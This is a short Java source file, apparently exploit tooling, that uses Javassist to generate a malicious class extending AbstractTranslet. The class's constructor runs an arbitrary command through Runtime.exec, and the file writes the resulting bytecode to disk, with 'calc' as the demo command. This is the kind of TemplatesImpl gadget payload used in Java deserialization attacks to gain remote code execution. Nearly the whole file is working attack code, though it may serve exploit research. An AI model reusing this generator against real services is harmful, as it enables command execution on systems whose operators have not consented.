package javassist;

import javassist.*;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class GetShellByteCodes {

    public static byte[] getTemplatesImpl(String cmd){
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("A");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = CtNewConstructor.make("public A(){Runtime.getRuntime().exec(\"" + cmd + "\");\n}", ctClass);
            ctClass.addConstructor(constructor);
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;

        }catch (Exception e){
            e.printStackTrace();
            return new byte[]{};
        }
    }

    public static void WriteShell() throws IOException {
        byte[] shell = GetShellByteCodes.getTemplatesImpl("calc");
        FileOutputStream fileOutputStream = new FileOutputStream(new File("S"));
        fileOutputStream.write(shell);
    }
    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {
        WriteShell();
    }
}